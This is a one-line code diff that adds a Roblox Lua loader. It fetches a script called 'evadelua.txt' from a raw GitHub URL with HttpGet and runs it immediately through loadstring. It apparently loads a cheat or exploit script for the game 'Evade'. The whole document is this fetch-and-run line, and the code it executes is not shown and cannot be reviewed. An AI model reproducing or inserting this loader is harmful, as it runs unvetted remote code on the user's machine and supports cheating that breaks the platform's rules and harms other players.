@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ttuws/Evade-tom/main/evadelua.txt"))()
